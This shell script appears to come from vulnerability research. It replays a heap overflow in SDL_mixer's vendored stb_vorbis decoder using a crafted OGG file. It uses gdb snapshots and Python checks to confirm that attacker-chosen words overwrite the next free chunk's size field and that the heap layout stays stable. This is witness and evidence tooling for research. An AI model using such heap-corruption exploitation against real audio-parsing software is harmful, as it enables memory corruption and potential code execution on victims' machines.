#!/bin/sh
# W207: one-command witness replay for the real-consumer heap lane.
#
# The SDL_mixer consumer and its vendored stb_vorbis v1.22 source are NOT
# modified. A plain (-O0 -g, no ASan) build lets the 30 file-chosen OOB stores
# complete; gdb snapshots the same chunk before and after the expansion loop.
# Checks: plain vuln aborts, safe input is clean, no live object sits in the
# OOB range, the chosen word overwrites the next free chunk's size field,
# and padding the file does not change the layout (negative grooming result).
# The fixed-build and ASan controls are replayed through run-consumer.sh.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE" || exit 2
mkdir -p consumer/evidence
printf 'not an ogg file\n' > evidence/safe-input.bin
SDM=../sdlmixer2shell/deps
SDL3DIR=$(CDPATH= cd -- "$SDM/SDL3-3.4.0-build" && pwd)
[ -n "$SDL3DIR" ] || exit 2
INC="-I$SDM/SDL3-3.4.0-build/include -I$SDM/SDL-release-3.2.4/include -I$SDM/SDL_mixer-vuln-src/include"
LIBS="-lSDL3_mixer -lSDL3 -lm -lpthread -ldl"

if [ ! -f consumer/mix-vuln-stb-plain/libSDL3_mixer.a ]; then
    cmake -S "$SDM/SDL_mixer-vuln-src" -B consumer/mix-vuln-stb-plain \
        -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' \
        -DSDL3_DIR="$SDL3DIR" -DSDLMIXER_VORBIS_STB=ON \
        -DSDLMIXER_VORBIS_VORBISFILE=OFF -DSDLMIXER_VORBIS_TREMOR=OFF \
        -DBUILD_SHARED_LIBS=OFF -DSDLMIXER_TESTS=OFF -DSDLMIXER_EXAMPLES=OFF \
        > consumer/mix-vuln-plain-config.log 2>&1 || exit 2
    cmake --build consumer/mix-vuln-stb-plain -j4 \
        > consumer/mix-vuln-plain-build.log 2>&1 || exit 2
fi
gcc -g -O0 -fno-omit-frame-pointer -o consumer/mix-stb-vuln-plain \
    consumer/mix-driver.c $INC -L"$SDL3DIR" -Lconsumer/mix-vuln-stb-plain $LIBS || exit 2
export LD_LIBRARY_PATH="$SDL3DIR"
export SDL_AUDIO_DRIVER=dummy

./consumer/mix-stb-vuln-plain evidence/chosen.ogg \
    > consumer/evidence/plain-attack.out 2>&1
VULN_RC=$?
./consumer/mix-stb-vuln-plain evidence/safe-input.bin \
    > consumer/evidence/plain-safe.out 2>&1
SAFE_RC=$?

gdb -batch -x consumer/heap-break.gdb ./consumer/mix-stb-vuln-plain \
    > consumer/evidence/heap-gdb-snapshots.out 2>&1
GDB_RC=$?

for sz in 4096 65536 1048576; do
    f="evidence/pad$sz.ogg"
    cp evidence/chosen.ogg "$f"
    truncate -s "$sz" "$f"
    gdb -batch -ex "set args $f" -x consumer/heap-sweep.gdb \
        ./consumer/mix-stb-vuln-plain > "consumer/evidence/sweep-$sz.out" 2>&1
done

sh run-consumer.sh > consumer/evidence/consumer-controls.out 2>&1
CTL_RC=$?

printf 'vuln_rc=%s safe_rc=%s gdb_rc=%s controls_rc=%s\n' \
    "$VULN_RC" "$SAFE_RC" "$GDB_RC" "$CTL_RC"
PASS=0; FAIL=0
check() {
    if grep -qF "$2" "$3"; then PASS=$((PASS+1)); echo "PASS $1 $2";
    else FAIL=$((FAIL+1)); echo "FAIL $1 expected $2"; fi
}
[ "$VULN_RC" -ne 0 ] && { PASS=$((PASS+1)); echo "PASS vuln_aborts rc=$VULN_RC"; } || { FAIL=$((FAIL+1)); echo 'FAIL vuln_aborts rc=0'; }
[ "$SAFE_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS safe_clean rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL safe_clean rc=$SAFE_RC"; }
[ "$GDB_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS gdb_stopped rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL gdb_stopped rc=$GDB_RC"; }
[ "$CTL_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS asan_controls rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL asan_controls rc=$CTL_RC"; }
check plain_abort_msg 'malloc(): invalid size (unsorted)' consumer/evidence/plain-attack.out
check pre_stop 'W207_PRE mult=' consumer/evidence/heap-gdb-snapshots.out
check post_stop 'W207_POST mult=' consumer/evidence/heap-gdb-snapshots.out
check real_api 'MIX_LoadAudio_IO' consumer/evidence/heap-gdb-snapshots.out
check stb_caller 'STBVORBIS_init_audio' consumer/evidence/heap-gdb-snapshots.out
if [ "$CTL_RC" -eq 0 ] && grep -qF 'TOTAL PASS=12 FAIL=0' consumer/evidence/consumer-controls.out; then
    PASS=$((PASS+1)); echo 'PASS run_consumer 12/0'
else
    FAIL=$((FAIL+1)); echo 'FAIL run_consumer not 12/0'
fi

python3 - <<'PY' || exit 2
import re, sys
SNAP = 'consumer/evidence/heap-gdb-snapshots.out'
SWEEPS = ['consumer/evidence/sweep-%d.out' % n for n in (4096, 65536, 1048576)]
WORD = 0x4b434148
TCACHE = 0x7ffff7c04b20

def read(path):
    return open(path, errors='replace').read().splitlines()

def dump(lines, marker):
    idx = next(i for i, l in enumerate(lines) if l.startswith(marker))
    m = re.search(r'mult=(0x[0-9a-f]+)', lines[idx])
    if not m:
        raise SystemExit('FAIL no mult address after %s' % marker)
    base = int(m.group(1), 16)
    words64 = {}
    words32 = {}
    for line in lines[idx+1:]:
        row = re.match(r'0x([0-9a-f]+):\s+((?:0x[0-9a-f]+\s*)+)', line)
        if not row:
            break
        at = int(row.group(1), 16)
        for n, v in enumerate(row.group(2).split()):
            val = int(v, 16)
            words64[at + 8*n] = val
            words32[at + 8*n] = val & 0xffffffff
            words32[at + 8*n + 4] = val >> 32
    return base, words64, words32

p, f = 0, 0
def ok(label, cond):
    global p, f
    if cond: p += 1; print('PASS', label)
    else: f += 1; print('FAIL', label)

lines = read(SNAP)
base, pre, pre32 = dump(lines, 'W207_PRE mult=')
_, post, post32 = dump(lines, 'W207_POST mult=')
ok('pre_8byte_chunk_header', pre.get(base-8) == 0x21)
ok('pre_next_chunk_size_0x91', pre.get(base+24) == 0x91)
ok('pre_no_live_object_tcache_fd', pre.get(base) == TCACHE)
ok('pre_no_live_object_tcache_key', pre.get(base+8) == TCACHE)
ok('post_next_chunk_size_clobbered', post32.get(base+24) == WORD)
ok('post_30_oob_words', all(post32.get(base+4*k) == WORD for k in range(2, 32)))
ok('post_oob_extent_120B', post32.get(base+124) == WORD and post32.get(base+128) == 0)

bases = {base}
for path in SWEEPS:
    sl = read(path)
    sb, spre, _ = dump(sl, 'W207_PRE mult=')
    _, spost, _ = dump(sl, 'W207_POST mult=')
    bases.add(sb)
    ok('sweep_%s_pre_same_free_chunk' % path.rsplit('-',1)[-1].split('.')[0],
       spre.get(sb+24) == 0x91 and spre.get(sb) == TCACHE)
    ok('sweep_%s_post_size_clobber' % path.rsplit('-',1)[-1].split('.')[0],
       spost.get(sb+24) == ((WORD << 32) | WORD))
ok('padding_no_layout_change', len(bases) == 1)
print('PYTHON PASS=%d FAIL=%d' % (p, f))
sys.exit(1 if f else 0)
PY
PY_RC=$?
if [ "$PY_RC" -eq 0 ]; then PASS=$((PASS+1)); echo 'PASS heap_words'; else FAIL=$((FAIL+1)); echo 'FAIL heap_words'; fi
echo "TOTAL PASS=$PASS FAIL=$FAIL"
echo '--- snapshot summary ---'
grep -E 'W207_PRE mult|W207_POST mult' consumer/evidence/heap-gdb-snapshots.out
[ "$FAIL" -eq 0 ]
